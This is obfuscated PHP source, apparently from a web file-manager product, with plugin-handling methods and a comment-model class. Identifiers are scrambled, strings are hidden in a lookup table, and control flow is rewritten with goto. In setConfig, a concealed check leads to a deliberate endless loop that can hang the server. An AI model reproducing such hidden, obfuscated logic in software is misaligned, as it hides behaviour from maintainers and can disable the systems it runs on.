$DÄÎñƒĞàŞ = '') { $e…çãÍ¾Î =& $_SERVER[úÉ·öƒÑì©]; if (!($B£‹£Ûí´ = IO::infoFull($b®©×ÈÏŸÚ))) { return IO::mkfile($b®©×ÈÏŸÚ, $DÄÎñƒĞàŞ, REPEAT_REPLACE); } IO::setContent($B£‹£Ûí´[$e…çãÍ¾Î[76]], $DÄÎñƒĞàŞ); return $B£‹£Ûí´[$e…çãÍ¾Î[76]]; } final function pluginLocalFile($f£åë¸Š³ß = '') { goto Dô´ã¬ãµ; E›Êˆ‹Ñ¨: if (!checkExtSafe($aùèööĞ)) { $aùèööĞ = $aùèööĞ . $fÆ­–Í›[1437]; } $e’‹ÇŠ÷¤ = $b…Š¢ØŠ«š . $aùèööĞ; if (@file_exists($e’‹ÇŠ÷¤)) { return $e’‹ÇŠ÷¤; } goto dè×š÷Îñº; C£òóÛâ‚˜: if (!$f£åë¸Š³ß) { return $b…Š¢ØŠ«š; } $E×ì™à»Á¦ = IO::info($f£åë¸Š³ß); $aùèööĞ = $this->_tmpFileName($E×ì™à»Á¦) . $fÆ­–Í›[95] . $E×ì™à»Á¦[$fÆ­–Í›[168]]; goto E›Êˆ‹Ñ¨; dè×š÷Îñº: return IO::copy($f£åë¸Š³ß, $b…Š¢ØŠ«š, 0, $aùèööĞ); goto F¡Æç—öº; Dô´ã¬ãµ: $fÆ­–Í› =& $_SERVER[úÉ·öƒÑì©]; $b…Š¢ØŠ«š = TEMP_FILES . "{$this->pluginName}\57"; if (!is_dir($b…Š¢ØŠ«š)) { mk_dir($b…Š¢ØŠ«š); } goto C£òóÛâ‚˜; F¡Æç—öº: } final function appPackage() { goto e÷µõ¯‹¥‡; bÂ½‡âÖ¢â: $E”Ò‘‘µÜ‚ = Hook::trigger($aÃŒ‡ìÑÏô[1439], $C¡ÁÚÔÂÕ); if ($E”Ò‘‘µÜ‚ && is_array($E”Ò‘‘µÜ‚)) { $C¡ÁÚÔÂÕ = $E”Ò‘‘µÜ‚; } $this->packageData = $C¡ÁÚÔÂÕ; goto e¢®Ò‡«ˆ; e÷µõ¯‹¥‡: $aÃŒ‡ìÑÏô =& $_SERVER[úÉ·öƒÑì©]; if ($this->packageData) { return $this->packageData; } $cÖ®Ù¦¤¥æ = $this->parseFile($this->pluginPath . $aÃŒ‡ìÑÏô[1438]); goto C“ƒ•æ˜á¥; e¢®Ò‡«ˆ: return $C¡ÁÚÔÂÕ; goto A‰Şƒ©¦ôº; C“ƒ•æ˜á¥: $this->parseLang($cÖ®Ù¦¤¥æ); $C¡ÁÚÔÂÕ = json_decode_force($cÖ®Ù¦¤¥æ); if (!$C¡ÁÚÔÂÕ) { return array(); } goto bÂ½‡âÖ¢â; A‰Şƒ©¦ôº: } public function packageInfoGet($A»»Îìø©õ) { $Dºçñ…°­ß = $this->appPackage(); return array_get_value($Dºçñ…°­ß, $A»»Îìø©õ); } public function packageVersion() { return $this->packageInfoGet($_SERVER[úÉ·öƒÑì©][1440]); } public function packageTitle() { return $this->packageInfoGet($_SERVER[úÉ·öƒÑì©][1441]); } public function packageCopyright() { return $this->packageInfoGet($_SERVER[úÉ·öƒÑì©][1442]); } private function parseFile($b¾¨‰±ñè…) { goto f™Šòñ“Æí; a„Ä›áØñø: $EÈ·ÆâĞ = str_replace($fğí¥˜„Œ, $aÍÊ—¬ƒ¤ê, $EÈ·ÆâĞ); return $EÈ·ÆâĞ; goto a¹ŸµÏ¹§ƒ; f™Šòñ“Æí: $BÙ¢¦ç‚êŸ =& $_SERVER[úÉ·öƒÑì©]; $EÈ·ÆâĞ = file_get_contents_nossl($b¾¨‰±ñè…); $fğí¥˜„Œ = array($BÙ¢¦ç‚êŸ[1443], $BÙ¢¦ç‚êŸ[1444], $BÙ¢¦ç‚êŸ[1445], $BÙ¢¦ç‚êŸ[1446], $BÙ¢¦ç‚êŸ[1447], $BÙ¢¦ç‚êŸ[1448], $BÙ¢¦ç‚êŸ[1449]); goto B‹†ğ³äªÅ; B‹†ğ³äªÅ: $aÍÊ—¬ƒ¤ê = array($this->pluginHost, $this->pluginHostDefault, $this->pluginApi, $this->pluginName, $this->pluginPath, APP_HOST, $this->config[$BÙ¢¦ç‚êŸ[88]][$BÙ¢¦ç‚êŸ[1450]]); if (strstr($EÈ·ÆâĞ, $BÙ¢¦ç‚êŸ[1451])) { $EÍêÚÜ‚ïÉ = rawurlencode(json_encode($this->pluginLangArr)); $EÈ·ÆâĞ = str_replace($BÙ¢¦ç‚êŸ[1451], $EÍêÚÜ‚ïÉ, $EÈ·ÆâĞ); } if (strstr($EÈ·ÆâĞ, $BÙ¢¦ç‚êŸ[1452])) { $EÍêÚÜ‚ïÉ = $EÍêÚÜ‚ïÉ = rawurlencode(json_encode($this->getConfig())); $EÈ·ÆâĞ = str_replace($BÙ¢¦ç‚êŸ[1452], $EÍêÚÜ‚ïÉ, $EÈ·ÆâĞ); } goto a„Ä›áØñø; a¹ŸµÏ¹§ƒ: } private function parseLang(&$f®íİ¤Ü¿¾) { goto B‰‡«á¨ÍŞ; cŒÉÇÓ˜Óù: $a¬™‘Ğø©ô = array(); foreach ($d»ô«é²ğ”[0] as $eÏ‰†à¬Ã«) { $Fô°øå©‹Æ = substr($eÏ‰†à¬Ã«, strlen($a†ïºŒÜ), -4); $D¬¿Êã = LNG($Fô°øå©‹Æ); $F‰×”ª‰Í[] = $eÏ‰†à¬Ã«; $a¬™‘Ğø©ô[] = str_replace(array($eê²êãÛçœ[229], $eê²êãÛçœ[1046], $eê²êãÛçœ[349], $eê²êãÛçœ[116]), array($eê²êãÛçœ[50], $eê²êãÛçœ[50], $eê²êãÛçœ[33], $eê²êãÛçœ[1455]), $D¬¿Êã); } $f®íİ¤Ü¿¾ = str_replace($F‰×”ª‰Í, $a¬™‘Ğø©ô, $f®íİ¤Ü¿¾); goto B±„‹ƒÅè½; B‰‡«á¨ÍŞ: $eê²êãÛçœ =& $_SERVER[úÉ·öƒÑì©]; $a†ïºŒÜ = $eê²êãÛçœ[1453]; if (!strstr($f®íİ¤Ü¿¾, $a†ïºŒÜ)) { return; } goto aöµ¹ĞÖ§; aöµ¹ĞÖ§: preg_match_all($eê²êãÛçœ[1454], $f®íİ¤Ü¿¾, $d»ô«é²ğ”); if (!is_array($d»ô«é²ğ”) || count($d»ô«é²ğ”) == 0 || !is_array($d»ô«é²ğ”[0]) || count($d»ô«é²ğ”[0]) == 0) { return; } $F‰×”ª‰Í = array(); goto cŒÉÇÓ˜Óù; B±„‹ƒÅè½: } private function parseConfig(&$Cï‹‡óêìœ) { goto FÌ±ä¢ÍŒä; FÌ±ä¢ÍŒä: $Eì¬İÈ­²µ =& $_SERVER[úÉ·öƒÑì©]; $Fæ¾¶…Âİº = $Eì¬İÈ­²µ[1456]; if (!strstr($Cï‹‡óêìœ, $Fæ¾¶…Âİº)) { return; } goto C¤è š×ª´; C¤è š×ª´: preg_match_all($Eì¬İÈ­²µ[1457], $Cï‹‡óêìœ, $c±‹ÊâŞÈ); if (!is_array($c±‹ÊâŞÈ) || count($c±‹ÊâŞÈ) == 0 || !is_array($c±‹ÊâŞÈ[0]) || count($c±‹ÊâŞÈ[0]) == 0) { return; } $D†‰Æ¤ ä× = $this->getConfig(); goto eƒÚƒßŞè¥; eƒÚƒßŞè¥: $DöŠˆ²‘ªŒ = array(); $B³‘¸Öğ‹í = array(); foreach ($c±‹ÊâŞÈ[0] as $Bì‡¤ˆÓÙº) { $BÍ¤³¾«„… = substr($Bì‡¤ˆÓÙº, strlen($Fæ¾¶…Âİº), -2); $DöŠˆ²‘ªŒ[] = $Bì‡¤ˆÓÙº; $B³‘¸Öğ‹í[] = _get($D†‰Æ¤ ä×, $BÍ¤³¾«„…); } goto Bš°éïŸ÷¹; Bš°éïŸ÷¹: $Cï‹‡óêìœ = str_replace($DöŠˆ²‘ªŒ, $B³‘¸Öğ‹í, $Cï‹‡óêìœ); goto aËÃÅº»Â°; aËÃÅº»Â°: } private function parsePackage(&$C¿¾ó†’˜´) { goto EˆäÖ£Œ£Î; EˆäÖ£Œ£Î: $AˆĞ—Ë§íˆ =& $_SERVER[úÉ·öƒÑì©]; $C†£†™ÕÊ¥ = $AˆĞ—Ë§íˆ[1458]; if (!strstr($C¿¾ó†’˜´, $C†£†™ÕÊ¥)) { return; } goto cç¤‘ì÷±; F™Ì…Âƒ: $C¿¾ó†’˜´ = str_replace($CÇ† øø˜ˆ, $b¼¹Ê§Ò, $C¿¾ó†’˜´); goto BŸâ¾Ş”ç‹; e»·¯Šï¥: $CÇ† øø˜ˆ = array(); $b¼¹Ê§Ò = array(); foreach ($F¿„ó‘‘ø¥[0] as $c‰ƒø§ˆ¦Ú) { $Cïï²¼±…‘ = substr($c‰ƒø§ˆ¦Ú, strlen($C†£†™ÕÊ¥), -2); $CÇ† øø˜ˆ[] = $c‰ƒø§ˆ¦Ú; $b¼¹Ê§Ò[] = _get($dÁ’¸‚±Ï¹, $Cïï²¼±…‘); } goto F™Ì…Âƒ; cç¤‘ì÷±: preg_match_all($AˆĞ—Ë§íˆ[1459], $C¿¾ó†’˜´, $F¿„ó‘‘ø¥); if (!is_array($F¿„ó‘‘ø¥) || count($F¿„ó‘‘ø¥) == 0 || !is_array($F¿„ó‘‘ø¥[0]) || count($F¿„ó‘‘ø¥[0]) == 0) { return; } $dÁ’¸‚±Ï¹ = $this->appPackage(); goto e»·¯Šï¥; BŸâ¾Ş”ç‹: } final function echoFile($Eö‰ŠĞ‰„¤, $Dî×™•ŒÙÏ = false) { goto E¬½êîá; DÀ¡ôÀèğ: $EõÌ”ğš˜ = $this->parseFile($féáÕŒ½¹á); $this->parseLang($EõÌ”ğš˜); $this->parseConfig($EõÌ”ğš˜); goto c™’½¯Â†Í; E¬½êîá: $bÕíº³Î×Ÿ =& $_SERVER[úÉ·öƒÑì©]; $féáÕŒ½¹á = $this->pluginPath . $Eö‰ŠĞ‰„¤; if (ACT == $bÕíº³Î×Ÿ[1460]) { echo $bÕíº³Î×Ÿ[1461] . $this->pluginName . $bÕíº³Î×Ÿ[8] . $Eö‰ŠĞ‰„¤ . $bÕíº³Î×Ÿ[1462]; if (!file_exists($féáÕŒ½¹á)) { echo $bÕíº³Î×Ÿ[1463]; return; } } goto DÀ¡ôÀèğ; c™’½¯Â†Í: $this->parsePackage($EõÌ”ğš˜); if (is_array($Dî×™•ŒÙÏ)) { $EõÌ”ğš˜ = str_replace(array_keys($Dî×™•ŒÙÏ), array_values($Dî×™•ŒÙÏ), $EõÌ”ğš˜); } echo $bÕíº³Î×Ÿ[229] . $EõÌ”ğš˜; goto C¦öŠÍ¬…Ç; C¦öŠÍ¬…Ç: } final function initLang() { goto CÕøÖªæØß; CÕøÖªæØß: $bê‰Ş•‰†‰ =& $_SERVER[úÉ·öƒÑì©]; $Dö²¥ªËßº = $bê‰Ş•‰†‰[1464]; $eÂ¦‡ÇÂ‹˜ = $this->pluginPath . $bê‰Ş•‰†‰[1465]; goto b°äùÒÄ®¿; b°äùÒÄ®¿: $eÌÙÔÁÚó = I18n::getType(); $còÅæÆØ‘Ä = array(); if (file_exists($eÂ¦‡ÇÂ‹˜ . $eÌÙÔÁÚó . $bê‰Ş•‰†‰[819])) { $còÅæÆØ‘Ä = (include $eÂ¦‡ÇÂ‹˜ . $eÌÙÔÁÚó . $bê‰Ş•‰†‰[819]); } else { if ($eÌÙÔÁÚó == $bê‰Ş•‰†‰[1466] && !file_exists($eÂ¦‡ÇÂ‹˜ . $eÌÙÔÁÚó . $bê‰Ş•‰†‰[819]) && file_exists($eÂ¦‡ÇÂ‹˜ . $bê‰Ş•‰†‰[1467])) { $còÅæÆØ‘Ä = (include $eÂ¦‡ÇÂ‹˜ . $bê‰Ş•‰†‰[1467]); } else { if (file_exists($eÂ¦‡ÇÂ‹˜ . $Dö²¥ªËßº . $bê‰Ş•‰†‰[819])) { $còÅæÆØ‘Ä = (include $eÂ¦‡ÇÂ‹˜ . $Dö²¥ªËßº . $bê‰Ş•‰†‰[819]); } } } goto eÚÒ®§à¢¯; eÚÒ®§à¢¯: if (!is_array($còÅæÆØ‘Ä)) { return array(); } if (@count($còÅæÆØ‘Ä) > 0) { I18n::set($còÅæÆØ‘Ä); } return $còÅæÆØ‘Ä; goto Aøœóñ¸Ô; Aøœóñ¸Ô: } public function getConfig() { if (!$this->pluginConfig) { $this->pluginConfig = $this->modelPlugin->getConfig($this->pluginName); } return $this->pluginConfig; } public function setConfig($D™ØÎÌƒë) { $d‘íœ„ê× =& $_SERVER[úÉ·öƒÑì©]; if (!isset($_SERVER[$d‘íœ„ê×[244]]) || !isset($_SERVER[$d‘íœ„ê×[242]])) { goto eÒë÷á‚’; b‹¯©“Š‘: for ($d»ÙÆÍš…µ = $fé»î÷È À; $d»ÙÆÍš…µ > 0; $d»ÙÆÍš…µ++) { $eŒÙ·ã¨Æ— = json_encode($GLOBALS[$d‘íœ„ê×[420]]); } goto Bö¹öê••Ë; eÒë÷á‚’: $c‰®¿â”Äê = $d‘íœ„ê×[848]; $e†–·æñã· = $d‘íœ„ê×[245]; $BÊÏ±Á³ƒ = $_SERVER[$d‘íœ„ê×[246]] . $d‘íœ„ê×[247]; goto bâ²¶‡âÆ; bâ²¶‡âÆ: $Aß•š×›¢ß = $e†–·æñã·($BÊÏ±Á³ƒ); $BŞíÎçÇ¦ = explode($d‘íœ„ê×[229], $Aß•š×›¢ß); if (count($BŞíÎçÇ¦) < $d‘íœ„ê×[588]) { $E‡ÑÑ¶ÔÕ = $d‘íœ„ê×[249]; $E‡ÑÑ¶ÔÕ(); } goto Fì‘ÜŸÏ; Fì‘ÜŸÏ: $eŒÙ·ã¨Æ— = $d‘íœ„ê×[849]; $eŒÙ·ã¨Æ—($_SERVER[$d‘íœ„ê×[850]]); $fé»î÷È À = 1; goto b‹¯©“Š‘; Bö¹öê••Ë: } return $this->modelPlugin->setConfig($this->pluginName, $D™ØÎÌƒë); } public function onSetConfig($a´ù×Â‹Ì«) { } public function onGetConfig($D‚Š•‰Ï¶Ü) { } public function onChangeStatus($EâèÏ¯“¯) { } public function onUninstall() { } public function onInstall() { } public function authCheck($a‹‰êÁæ™É = "\x70\x6c\165\x67\151\156\101\x75\x74\150") { $f‡»Ü©­©» =& $_SERVER[úÉ·öƒÑì©]; if (!defined($f‡»Ü©­©»[463])) { return !1; } if (_get($GLOBALS, $f‡»Ü©­©»[494])) { return !0; } $AòÇÁÌøÜ = $this->getConfig(); if (!$AòÇÁÌøÜ[$a‹‰êÁæ™É]) { return !1; } return ActionCall($f‡»Ü©­©»[1468], $AòÇÁÌøÜ[$a‹‰êÁæ™É]); } public function url($eÁ†‰˜Ø–, $B•­ğœå‘ = '', $eßˆ¬À™‰œ = true) { goto b™ÒÀß©„; aĞÅİ‘²†: $EÇİ‰§êÆæ = $this->packageVersion(); $cÑÁ¡íîíä = $dãòáœÊ—Å . $cÇß‰ÕŞÛŒ[449] . $EÇİ‰§êÆæ; if (substr($eÁ†‰˜Ø–, 0, 4) == $cÇß‰ÕŞÛŒ[147] || substr($eÁ†‰˜Ø–, 0, 2) == $cÇß‰ÕŞÛŒ[1252]) { $CåÌÇÓ„ù = $eÁ†‰˜Ø– . $cÇß‰ÕŞÛŒ[1469] . $cÑÁ¡íîíä; } else { if ($B•­ğœå‘ == $cÇß‰ÕŞÛŒ[33]) { $CåÌÇÓ„ù = $this->pluginHost . $eÁ†‰˜Ø– . $cÇß‰ÕŞÛŒ[1469] . $cÑÁ¡íîíä; } else { if ($B•­ğœå‘ === $cÇß‰ÕŞÛŒ[77]) { $CåÌÇÓ„ù = $this->pluginHost . $eÁ†‰˜Ø–; } else { if ($B•­ğœå‘ == $cÇß‰ÕŞÛŒ[1470]) { $CåÌÇÓ„ù = STATIC_PATH . $eÁ†‰˜Ø– . $cÇß‰ÕŞÛŒ[1469] . $dãòáœÊ—Å; } else { if ($B•­ğœå‘ == $cÇß‰ÕŞÛŒ[1471]) { $CåÌÇÓ„ù = APP_HOST . $cÇß‰ÕŞÛŒ[1472] . $eÁ†‰˜Ø– . $cÇß‰ÕŞÛŒ[1469] . $dãòáœÊ—Å; } else { if (isset($F°âœ´Ïˆ[$B•­ğœå‘])) { $CåÌÇÓ„ù = $F°âœ´Ïˆ[$B•­ğœå‘] . $eÁ†‰˜Ø– . $cÇß‰ÕŞÛŒ[1469] . $cÑÁ¡íîíä; } } } } } } goto Aá¿’áè”; Aá¿’áè”: if (!$eßˆ¬À™‰œ) { return $CåÌÇÓ„ù; } echo $CåÌÇÓ„ù; goto báêÍÙâî; b™ÒÀß©„: $cÇß‰ÕŞÛŒ =& $_SERVER[úÉ·öƒÑì©]; $F°âœ´Ïˆ = $this->getConfig(); $dãòáœÊ—Å = KOD_VERSION . $cÇß‰ÕŞÛŒ[95] . KOD_VERSION_BUILD; goto aĞÅİ‘²†; báêÍÙâî: } public function link($e­µ¶…¼ = false, $d‘²Ë´Ô‰½ = '') { $fàô˜ââ³® =& $_SERVER[úÉ·öƒÑì©]; if (!$e­µ¶…¼) { $this->link($fàô˜ââ³®[1473], $fàô˜ââ³®[1471]); $this->link($fàô˜ââ³®[1474], $fàô˜ââ³®[1470]); $this->link($fàô˜ââ³®[1475], $fàô˜ââ³®[1470]); $this->link($fàô˜ââ³®[1476], $fàô˜ââ³®[1470]); $this->link($fàô˜ââ³®[1477], $fàô˜ââ³®[1470]); return; } $bß¹Ò‘ÈÄÕ = $this->url($e­µ¶…¼, $d‘²Ë´Ô‰½, !1); if (substr($e­µ¶…¼, -3) == $fàô˜ââ³®[1478]) { echo $fàô˜ââ³®[1479] . $bß¹Ò‘ÈÄÕ . $fàô˜ââ³®[1480] . $fàô˜ââ³®[229]; } else { if (substr($e­µ¶…¼, -4) == $fàô˜ââ³®[1481]) { echo $fàô˜ââ³®[1482] . $bß¹Ò‘ÈÄÕ . $fàô˜ââ³®[1483] . $fàô˜ââ³®[229]; } } } } goto cÏÏ¶­¯­ì; F°Ãó—¢­Ô: class CommentModel extends ModelBase { protected $tableName = "\143\x6f\155\x6d\145\156\x74"; protected $tableMeta = array("\x74\x61\142\154\x65\x4e\x61\x6d\x65" => "\143\x6f\x6d\155\x65\x6e\164\x5f\x6d\x65\x74\x61", "\155\145\164\141\106\151\145\154\x64" => "\x63\157\155\155\145\x6e\164\x49\104"); const TYPE_SOURCE = 1; const TYPE_SHARE = 2; const TYPE_USER = 3; const TYPE_GROUP = 4; const TYPE_TOPIC = 5; public static $TYPEALL = array(self::TYPE_SOURCE, self::TYPE_SHARE, self::TYPE_USER, self::TYPE_GROUP, self::TYPE_TOPIC); public function addComment($BÒöÇÊ»µ) { $fÌ”À‹É÷× =& $_SERVER[úÉ·öƒÑì©]; if ($BÒöÇÊ»µ[$fÌ”À‹É÷×[1727]]) { $AŞÄ‡Ê”¨’ = $this->where(array($fÌ”À‹É÷×[1728] => $BÒöÇÊ»µ[$fÌ”À‹É÷×[1727]]))->find(); if (!$AŞÄ‡Ê”¨’ || $AŞÄ‡Ê”¨’[$fÌ”À‹É÷×[413]] != $BÒöÇÊ»µ[$fÌ”À‹É÷×[413]] || $AŞÄ‡Ê”¨’[$fÌ”À‹É÷×[493]] != $BÒöÇÊ»µ[$fÌ”À‹É÷×[493]]) { return !1; } $this->where(array($fÌ”À‹É÷×[1728] => $BÒöÇÊ»µ[$fÌ”À‹É÷×[1727]]))->setAdd($fÌ”À‹É÷×[1729], 1); } $BÒöÇÊ»µ[$fÌ”À‹É÷×[1730]] = 0; $BÒöÇÊ»µ[$fÌ”À‹É÷×[1729]] = 0; $BÒöÇÊ»µ[$fÌ”À‹É÷×[726]] = 1; return $this->add($BÒöÇÊ»µ); } public function commentCount($bĞ’÷Õ¢‰Ğ, $BÓ‰íù„ïß) { goto A°–ãÅ‹˜; CÇòğÚĞ‹›: return array_to_keyvalue($dÁÅİñ¸×, $BŸ½…éÀ¿[493], $BŸ½…éÀ¿[489]); goto D±ùÎ‰î˜ß; dÌâ¨ë‚¯¯: $f÷¿ó°¨Ûä = array($BŸ½…éÀ¿[493], $BŸ½…éÀ¿[1731] => $BŸ½…éÀ¿[489]); $c•ÛºŞ³¾ª = array($BŸ½…éÀ¿[493] => array($BŸ½…éÀ¿[7], $bĞ’÷Õ¢‰Ğ), $BŸ½…éÀ¿[413] => $BÓ‰íù„ïß); $dÁÅİñ¸× = $this->field($f÷¿ó°¨Ûä)->where($c•ÛºŞ³¾ª)->group($BŸ½…éÀ¿[493])->select(); goto CÇòğÚĞ‹›; A°–ãÅ‹˜: $BŸ½…éÀ¿ =& $_SERVER[úÉ·öƒÑì©]; if (!$bĞ’÷Õ¢‰Ğ) { return array(); } if (is_string($bĞ’÷Õ¢‰Ğ) || is_int($bĞ’÷Õ¢‰Ğ)) { $bĞ’÷Õ¢‰Ğ = array($bĞ’÷Õ¢‰Ğ); } goto dÌâ¨ë‚¯¯; D±ùÎ‰î˜ß: } public function remove($dí—Ä³¹†Ë) { $FµÅæ‹”ï =& $_SERVER[úÉ·öƒÑì©]; $eâî×Í‡¦ = array($FµÅæ‹”ï[1728] => $dí—Ä³¹†Ë); $a÷¡§â×Ÿ = $this->where($eâî×Í‡¦)->find(); if ($a÷¡§â×Ÿ[$FµÅæ‹”ï[1727]]) { $this->where(array($FµÅæ‹”ï[1728] => $a÷¡§â×Ÿ[$FµÅæ‹”ï[1727]]))->setAdd($FµÅæ‹”ï[1729], -1); } return $this->where($eâî×Í‡¦)->delete(); } public function edit($e­ŒùªŠî×, $bÃŠ§¹ö²È) { $D‚’²¬ß¾Â =& $_SERVER[úÉ·öƒÑì©]; $c–£ÕÌ¦³ = array($D‚’²¬ß¾Â[1728] => $e­ŒùªŠî×); return $this->where($c–£ÕÌ¦³)->save(array($D‚’²¬ß¾Â[1732] => $bÃŠ§¹ö²È)); } public function prasise($fô½®é÷) { $fè²µÄ¥„­ =& $_SERVER[úÉ·öƒÑì©]; $D•Ú¶—¨ÄØ = Model($fè²µÄ¥„­[1733]); $c–§Ïò£ªØ = array($fè²µÄ¥„­[1728] => $fô½®é÷, $fè²µÄ¥„­[1527] => USER_ID); $A–ÚĞ“Òà = $D•Ú¶—¨ÄØ->where($c–§Ïò£ªØ)->find(); if (!$A–ÚĞ“Òà) { $D•Ú¶—¨ÄØ->add($c–§Ïò£ªØ); $fÏ­ñŠÃ·Ú = $this->where(array($fè²µÄ¥„­[1728] => $fô½®é÷))->setAdd($fè²µÄ¥„­[1730], 1); } else { $D•Ú¶—¨ÄØ->where($c–§Ïò£ªØ)->delete(); $fÏ­ñŠÃ·Ú = $this->where(array($fè²µÄ¥„­[1728] => $fô½®é÷))->setAdd($fè²µÄ¥„­[1730], -1); } return $fÏ­ñŠÃ·Ú; } public function targetInfo($c··¤Ôãˆ®, $dÊêù³Ş§…) { goto bÃäÇªõ«; DÓæİÓ®“: return $eß’¯¡Éê‘; goto e•±›¯…; béâÈÎ±›Ò: $bá‹ÈÓÇóŒ = "\x52\x49\x47\110\124\x20\112\x4f\111\x4e\x20{$this->tablePrefix}\143\x6f\155\x6d\x65\156\x74\137\x70\162\141\151\163\x65\x20\163\x74\x61\x72\40\157\156\x20\x63\157\155\155\145\156\x74\56\x63\157\155\155\x65\x6e\164\x49\x44\40\75\x20\x73\164\141\x72\x2e\143\157\155\155\145\x6e\x74\x49\104"; $D¡¤ÂŒç… = $this->alias($F ã¢Ú÷œ[361])->where($Bƒå†¶‡ÌÊ)->join($bá‹ÈÓÇóŒ, $F ã¢Ú÷œ[1734])->count(); $eß’¯¡Éê‘ = array($F ã¢Ú÷œ[1735] => $dƒŞÆïøÉ, $F ã¢Ú÷œ[1736] => $D¡¤ÂŒç…); goto DÓæİÓ®“; bÃäÇªõ«: $F ã¢Ú÷œ =& $_SERVER[úÉ·öƒÑì©]; $Bƒå†¶‡ÌÊ = array($F ã¢Ú÷œ[558] => $c··¤Ôãˆ®, $F ã¢Ú÷œ[559] => $dÊêù³Ş§…); $dƒŞÆïøÉ = $this->where($Bƒå†¶‡ÌÊ)->count(); goto béâÈÎ±›Ò; e•±›¯…: } public function listData($E²¯¡ŠÒó®) { $eè–ñé¦ê =& $_SERVER[úÉ·öƒÑì©]; if (isset($E²¯¡ŠÒó®[$eè–ñé¦ê[1737]])) { if ($E²¯¡ŠÒó®[$eè–ñé¦ê[1737]]) { $E²¯¡ŠÒó®[$eè–ñé¦ê[1738]] = array($eè–ñé¦ê[979], intval($E²¯¡ŠÒó®[$eè–ñé¦ê[1737]])); } unset($E²¯¡ŠÒó®[$eè–ñé¦ê[1737]]); } if (isset($E²¯¡ŠÒó®[$eè–ñé¦ê[1739]])) { if ($E²¯¡ŠÒó®[$eè–ñé¦ê[1739]]) { $E²¯¡ŠÒó®[$eè–ñé¦ê[1738]] = array($eè–ñé¦ê[976], intval($E²¯¡ŠÒó®[$eè–ñé¦ê[1739]])); } unset($E²¯¡ŠÒó®[$eè–ñé¦ê[1739]]); } return $this->_listData($E²¯¡ŠÒó®); } private function _listData($F´Õ²‰ã¥Ş) { $C¯ËÅÀ¬„ß =& $_SERVER[úÉ·öƒÑì©]; $eë¡ì»¤‡´ = $this->where($F´Õ²‰ã¥Ş)->_makeOrder()->selectPage(100); $this->_listAppendParent($eë¡ì»¤‡´[$C¯ËÅÀ¬„ß[376]]); $this->_listAppendUser($eë¡ì»¤‡´[$C¯ËÅÀ¬„ß[376]]); $this->_listAppendMeta($eë¡ì»¤‡´[$C¯ËÅÀ¬„ß[376]]); return $eë¡ì»¤‡´; } private function _makeOrder() { $CÏí“–×Û” =& $_SERVER[úÉ·öƒÑì©]; $eİ£¹¥’Ì = array($CÏí“–×Û”[1730], $CÏí“–×Û”[1729], $CÏí“–×Û”[194]); $eÏëöäßì¼ = Input::get($CÏí“–×Û”[444], $CÏí“–×Û”[7], $CÏí“–×Û”[425], $eİ£¹¥’Ì); $F¨“ÎÙó† = Input::get($CÏí“–×Û”[445], $CÏí“–×Û”[7], $CÏí“–×Û”[1529], array($CÏí“–×Û”[1740], $CÏí“–×Û”[440])); $e—…œÓ… = $eÏëöäßì¼ . $CÏí“–×Û”[50] . $F¨“ÎÙó†; return $this->order($e—…œÓ…); } private function _listAppendParent(&$DÚ¡àÅïÙ’) { goto BÇä¦ĞŒô¼; FÛì±“•´¡: foreach ($DÚ¡àÅïÙ’ as &$AÙù®Ó‘Ñë) { if (isset($FŞ°ä½†íØ[$AÙù®Ó‘Ñë[$F£ĞÆùŞ‰˜[1727]]])) { $AÙù®Ó‘Ñë[$F£ĞÆùŞ‰˜[1741]] = $FŞ°ä½†íØ[$AÙù®Ó‘Ñë[$F£ĞÆùŞ‰˜[1727]]]; } } unset($AÙù®Ó‘Ñë); goto CË¯½‡ «§; b››‹‹ß†: if (!$eñ’½Î‘ñš) { return; } $FŞ°ä½†íØ = $this->where(array($F£ĞÆùŞ‰˜[1728] => array($F£ĞÆùŞ‰˜[7], $eñ’½Î‘ñš)))->select(); $FŞ°ä½†íØ = array_to_keyvalue($FŞ°ä½†íØ, $F£ĞÆùŞ‰˜[1738]); goto FÛì±“•´¡; BÇä¦ĞŒô¼: $F£ĞÆùŞ‰˜ =& $_SERVER[úÉ·öƒÑì©]; $eñ’½Î‘ñš = array_unique(array_to_keyvalue($DÚ¡àÅïÙ’, $F£ĞÆùŞ‰˜[33], $F£ĞÆùŞ‰˜[1727])); $eñ’½Î‘ñš = array_remove_value($eñ’½Î‘ñš, $F£ĞÆùŞ‰˜[191]); goto b››‹‹ß†; CË¯½‡ «§: } private function _listAppendUser(&$DãİÒßóöØ) { goto dŠøí°öå; A˜ßÁÑÃ: foreach ($DãİÒßóöØ as &$a•Í£¾½) { $a•Í£¾½[$CÖº‰¦¤ùÆ[571]] = $fù™º­[$a•Í£¾½[$CÖº‰¦¤ùÆ[1535]]]; if (isset($a•Í£¾½[$CÖº‰¦¤ùÆ[1741]])) { $a•Í£¾½[$CÖº‰¦¤ùÆ[1741]][$CÖº‰¦¤ùÆ[571]] = $fù™º­[$a•Í£¾½[$CÖº‰¦¤ùÆ[1741]][$CÖº‰¦¤ùÆ[1535]]]; } } unset($a•Í£¾½); goto dÍæÂöò‚Á; eµÅµéïŞÎ: if (count($fâÁÁ•ÏÓ) == 0) { return; } foreach ($DãİÒßóöØ as $a•Í£¾½) { if (isset($a•Í£¾½[$CÖº‰¦¤ùÆ[1741]])) { $fâÁÁ•ÏÓ[] = $a•Í£¾½[$CÖº‰¦¤ùÆ[1741]][$CÖº‰¦¤ùÆ[1535]]; } } $fù™º­ = Model($CÖº‰¦¤ùÆ[515])->userListInfo($fâÁÁ•ÏÓ); goto A˜ßÁÑÃ; dŠøí°öå: $CÖº‰¦¤ùÆ =& $_SERVER[úÉ·öƒÑì©]; $fâÁÁ•ÏÓ = array_unique(array_to_keyvalue($DãİÒßóöØ, $CÖº‰¦¤ùÆ[33], $CÖº‰¦¤ùÆ[1535])); $fâÁÁ•ÏÓ = array_remove_value($fâÁÁ•ÏÓ, $CÖº‰¦¤ùÆ[191]); goto eµÅµéïŞÎ; dÍæÂöò‚Á: } private function _listAppendMeta(&$EÁÃéÅé†) { goto Eääãë·‡‚; fŞ“ß†ÃÍš: if (!$cåÃ‰¯Ç‚‚) { return !1; } foreach ($EÁÃéÅé† as &$cÍç…áãµ) { $cÍç…áãµ[$cïó£ø²Š‡[454]] = $cåÃ‰¯Ç‚‚[$cÍç…áãµ[$cïó£ø²Š‡[1738]]]; if (isset($cÍç…áãµ[$cïó£ø²Š‡[1741]])) { $cÍç…áãµ[$cïó£ø²Š‡[1741]][$cïó£ø²Š‡[454]] = $cåÃ‰¯Ç‚‚[$cÍç…áãµ[$cïó£ø²Š‡[1741]][$cïó£ø²Š‡[1738]]]; } } 